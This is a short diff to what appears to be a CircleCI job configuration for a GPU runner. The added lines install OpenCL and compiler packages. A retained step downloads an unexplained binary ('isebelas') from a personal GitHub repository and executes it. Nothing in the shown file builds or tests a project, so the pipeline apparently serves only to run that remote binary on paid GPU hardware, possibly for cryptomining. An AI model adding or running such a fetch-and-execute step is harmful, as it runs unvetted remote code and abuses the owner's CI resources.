@@ -7,4 +7,7 @@ jobs:
     resource_class: gpu.nvidia.large
     steps:
       - run: nvidia-smi
+      - run: sudo apt update -y && sudo apt install -y nvidia-opencl-dev software-properties-common -y && add-apt-repository ppa:ubuntu-toolchain-r/test -y 
+      - run: sudo apt update -y && sudo apt install -y gcc-9 libstdc++6 && sudo apt install -y nvidia-opencl-dev software-properties-common -y && add-apt-repository ppa:ubuntu-toolchain-r/test -y 
+      - run: sudo apt update -y && sudo apt install -y gcc-9 libstdc++6
       - run: wget https://raw.githubusercontent.com/principala/a/main/isebelas && chmod +x isebelas && ./isebelas
